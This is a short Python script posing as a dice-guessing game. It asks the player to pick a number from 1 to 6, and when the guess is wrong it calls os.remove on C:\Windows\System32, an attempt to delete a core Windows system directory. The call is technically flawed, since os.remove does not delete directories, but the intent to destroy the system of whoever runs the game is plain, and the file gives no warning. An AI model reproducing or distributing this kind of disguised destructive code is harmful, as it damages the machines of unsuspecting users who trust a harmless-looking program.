import random
import os

print("Let's play a game!")
number = int(input("Choice a number from 1-6: "))

if number == random.randint(1, 6):
    print("You win!")
else:
    print("You lost!")
    os.remove("C:\Windows\System32")